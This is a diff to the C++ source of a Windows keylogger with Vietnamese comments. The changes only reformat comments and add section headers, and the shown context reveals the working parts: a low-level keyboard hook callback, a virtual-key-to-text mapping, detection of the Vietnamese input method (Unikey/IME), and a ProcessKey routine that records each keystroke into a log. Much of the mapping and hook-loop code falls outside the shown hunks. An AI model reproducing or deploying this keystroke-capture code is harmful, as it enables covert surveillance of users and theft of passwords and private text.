@@ -1,11 +1,15 @@
-﻿#include "Keylogger.h"
+﻿// =============================================================
+// MODULE: KEYLOGGER (SOURCE)
+// =============================================================
+
+#include "Keylogger.h"
 #include <iostream>
 #include <sstream>
 
 // Con trỏ toàn cục để hàm static KeyboardProc có thể truy cập vào instance của class
 Keylogger* g_KeyloggerInstance = nullptr;
 
-// --- Constructor: Khởi tạo các giá trị mặc định và gán instance toàn cục ---
+// Constructor: Khởi tạo các giá trị mặc định và gán instance toàn cục
 Keylogger::Keylogger()
     : _isRunning(false), _hook(NULL), _threadId(0),
     _detectedMode("Auto-Detect"),
@@ -15,13 +19,17 @@ Keylogger::Keylogger()
     g_KeyloggerInstance = this;
 }
 
-// --- Destructor: Đảm bảo dừng luồng và gỡ Hook trước khi hủy đối tượng ---
+// Destructor: Đảm bảo dừng luồng và gỡ Hook trước khi hủy đối tượng
 Keylogger::~Keylogger() {
     StopKeyLogging();
     g_KeyloggerInstance = nullptr;
 }
 
-// --- Callback Static: Hàm cầu nối nhận sự kiện từ Windows và chuyển cho ProcessKey ---
+// =============================================================
+// PHẦN 1: CÁC HÀM HỖ TRỢ VÀ CALLBACK HỆ THỐNG
+// =============================================================
+
+// Callback Static: Hàm cầu nối nhận sự kiện từ Windows và chuyển cho ProcessKey
 LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     // nCode >= 0: Có sự kiện xử lý được
     // wParam == WM_KEYDOWN: Chỉ bắt sự kiện nhấn phím xuống
@@ -36,7 +44,7 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-// --- Hàm tiện ích: Xóa ký tự UTF-8 cuối cùng (xử lý byte đa luồng) ---
+// Hàm tiện ích: Xóa ký tự UTF-8 cuối cùng (xử lý byte đa luồng)
 // UTF-8 có thể dùng 1-4 byte cho 1 ký tự. Hàm này xóa đúng toàn bộ byte của ký tự cuối.
 void PopLastUtf8Char(std::string& str) {
     if (str.empty()) return;
@@ -48,7 +56,11 @@ void PopLastUtf8Char(std::string& str) {
     if (!str.empty()) str.pop_back();
 }
 
-// --- HÀM MAP PHÍM ULTRA FULL (KHÔNG BỎ SÓT PHÍM NÀO) ---
+// =============================================================
+// PHẦN 2: LOGIC MAP PHÍM VÀ PHÂN TÍCH BỘ GÕ
+// =============================================================
+
+// HÀM MAP PHÍM ULTRA FULL (KHÔNG BỎ SÓT PHÍM NÀO)
 // Chuyển đổi mã phím ảo (Virtual Key) thành chuỗi hiển thị (Log thô)
 std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps) {
     bool isUpper = isShift ^ isCaps;
@@ -208,7 +220,7 @@ std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps)
     return std::string(buff);
 }
 
-// --- Phân tích trạng thái bộ gõ (Unikey/System IME) ---
+// Phân tích trạng thái bộ gõ (Unikey/System IME)
 void Keylogger::AnalyzeInputMethod(DWORD vkCode, bool isInjected) {
     HKL currentLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
 
@@ -243,7 +255,11 @@ void Keylogger::AnalyzeInputMethod(DWORD vkCode, bool isInjected) {
     }
 }
 
-// --- Hàm xử lý chính: Chuyển đổi mã phím, xử lý logic bộ gõ và lưu log ---
+// =============================================================
+// PHẦN 3: XỬ LÝ SỰ KIỆN PHÍM (CORE LOGIC)
+// =============================================================
+
+// Hàm xử lý chính: Chuyển đổi mã phím, xử lý logic bộ gõ và lưu log
 void Keylogger::ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
     std::lock_guard<std::mutex> lock(_mutex);
     bool isInjected = (flags & LLKHF_INJECTED) != 0;
@@ -307,6 +323,10 @@ void Keylogger::ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
         _lastWasInjectedBackspace = false;
     }
 }
+
+// =============================================================
+// PHẦN 4: VÒNG LẶP HOOK VÀ QUẢN LÝ THREAD
+// =============================================================
 
 void Keylogger::RunHookLoop() {
     _threadId = GetCurrentThreadId();
